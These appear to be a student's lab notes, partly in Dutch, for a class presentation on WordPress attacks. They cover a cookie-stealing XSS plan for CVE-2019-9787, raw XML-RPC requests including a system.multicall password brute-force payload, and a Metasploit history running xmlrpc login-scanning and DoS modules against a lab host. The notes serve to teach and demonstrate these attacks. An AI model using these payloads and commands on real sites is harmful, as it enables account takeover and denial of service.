**Current choice**

Remote code execution on wordpress 2019 https://www.cvedetails.com/cve/CVE-2019-9787/ - SCORE 6.8 - COMPLEXITY: medium

    WordPress before 5.1.1 does not properly filter comment content, leading to Remote Code Execution by unauthenticated users in a default configuration. This occurs because CSRF protection is mishandled, and because Search Engine Optimization of A elements is performed incorrectly, leading to XSS. The XSS results in administrative access, which allows arbitrary changes to .php files. This is related to wp-admin/includes/ajax-actions.php and wp-includes/comment.php.

Needs wordpress before 5.1.1 https://wordpress.org/download/releases/#branch-50  
Use the 5.0.0 version

Host wordpress website, 
wordpress needs sql server
Create XSS javascript code that steals the cookie
Make admin look at comment
Inject cookie into server

https://www.youtube.com/watch?v=BfKK-pNmI6Y



**EXTRA** 

Wordpress bruteforce and ddos vulnerability 
/xmlrpc.php attack

        POST /xmlrpc.php HTTP/1.1
        Host: localhost
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
        Connection: close
        Content-Length: 85


        PAYLOAD 2: 

        <methodCall><methodName>system.listMethods</methodName><params></params></methodCall>

        POST /xmlrpc.php HTTP/1.1
        Host: localhost
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
        Connection: close
        Content-Length: 164

        <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
        <param><value>admin</value></param>
        <param><value>pass</value></param>
        </params>
        </methodCall>



MULTICALL om meerdere tegelijkertijd te proberen , ookal showed het dan maar op als 1 try voor wordpress zelf
        
        <methodCall>
        <methodName>system.multicall</methodName>
        <params>
            <param>
            <value>
                <array>
                <data>
                    <value>
                    <struct>
                        <member>
                        <name>methodName</name>
                        <value><string>wp.getUsersBlogs</string></value>
                        </member>
                        <member>
                        <name>params</name>
                        <value>
                            <array>
                            <data>
                                <value><string>admin</string></value>
                                <value><string>password1</string></value>
                            </data>
                            </array>
                        </value>
                        </member>
                    </struct>
                    </value>
                    <value>
                    <struct>
                        <member>
                        <name>methodName</name>
                        <value><string>wp.getUsersBlogs</string></value>
                        </member>
                        <member>
                        <name>params</name>
                        <value>
                            <array>
                            <data>
                                <value><string>admin</string></value>
                                <value><string>password2</string></value>
                            </data>
                            </array>
                        </value>
                        </member>
                    </struct>
                    </value>
                </data>
                </array>
            </value>
            </param>
        </params>
        </methodCall>


https://www.cvedetails.com/cve/CVE-2020-28035/
https://www.cvedetails.com/cve/CVE-2020-28036/
https://www.youtube.com/watch?v=bZQ6vuFioZQ

Via xmlrpc can you proberen inloggen en meerdere passwords en logins proberen tegelijkertijd. 





Metsploit framework,
launch het metasploit framework en kies dan de juiste 2 modules

1   search wordpress_xmlrpx_login
2   search wordpress_xmlrpc_login
3   use auxiliary/scanner/http/wordpress_xmlrpc_login
4   search wordpress_xmlrpc_login
5   use auxiliary/scanner/http/wordpress_xmlrpc_login
6   set RHOSTS 192.168.1.60
7   set USER_FILE /home/osboxes/rcp.txt
8   set PASS_FILE /home/osboxes/rcpp.txt
9   run
10  exit
11  search cve:wp AND 5.0.0
12  search
13  search cve
14  clear
15  search
16  clear
17  search wordpress
18  use auxiliary/dos/http/wordpress_xmlrpc_dos
19  set RHOSTS 192.168.1.60
20  sset RPORT 80
21  set RPORT 80
22  run
23  set RLIMIT 10000000
24  run
25  use auxiliary/dos/http/wordpress_xmlrpc_dos
26  set RHOSTS 192.168.1.60
27  set RLIMIT 10000000
28  set RPORT 80
29  run
30  use auxiliary/dos/http/wordpress_xmlrpc_dos
31  set RHOSTS 192.168.1.60
32  set RPORT 80
33  set RLIMIT 10000000
34  set THREADS 3
35  ?
36  show options
37  exit
38  history



Gebruikt `top` op de target server voor cpu usage te zien bij DOS attack  



Formulier 

        CVE-2020-28035 https://www.cvedetails.com/cve/CVE-2020-28035/

        Wordpress  voor de versie 5.5.2 maakt gebruik van XML-RPC, wat een potentieel beveiligingsrisico met zich meebrengt. Door een grote hoeveelheid HTTP-verzoeken naar de XML-RPC-endpoint te sturen, kunnen aanvallers een denial-of-service-aanval (DOS) uitvoeren.

        Bovendien kan deze methode door aanvallers worden gebruikt om op een minder opvallende manier gebruikersnamen en wachtwoorden te achterhalen. Door honderden pogingen in één enkel XML-RPC-verzoek te verbergen, kan een aanvaller brute force-aanvallen uitvoeren om toegang te krijgen tot beveiligde gegevens.

        In onze presentatie zullen we beide kwetsbaarheden demonstreren: de DOS-aanval en de gain privileges aanval.